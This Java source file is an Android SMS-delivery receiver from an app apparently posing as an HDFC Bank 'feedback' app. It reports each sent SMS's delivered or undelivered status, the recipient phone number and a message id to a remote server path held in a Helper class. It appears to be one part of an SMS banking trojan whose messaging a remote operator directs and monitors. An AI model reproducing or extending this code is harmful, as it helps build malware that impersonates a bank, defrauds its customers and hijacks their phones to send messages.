package com.feedback.hdfcbank01;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import org.json.JSONException;
import org.json.JSONObject;

public class DeliveredReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        int id = intent.getIntExtra("id", -1);
        String number = intent.getStringExtra("phone");
        String status = "";

        switch (getResultCode()) {
            case Activity.RESULT_OK:
                status = "Delivered";
                ////Log.d(Helper.TAG, "SMS delivered successfully.");
                break;
            default:
                status = "UnDelivered";
                ////Log.d(Helper.TAG, "SMS not delivered.");
                break;
        }

        JSONObject data = new JSONObject();
        try {
            Helper help = new Helper();
            data.put("status", status + " to "+number);
            data.put("id", id);
            data.put("site", help.SITE());
            Helper.postRequest(help.SMSSavePath(), data, new Helper.ResponseListener(){
                @Override
                public void onResponse(String result) {
                    ////Log.d("mywork", "status updated Result, "+ result);
                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }

    }
}

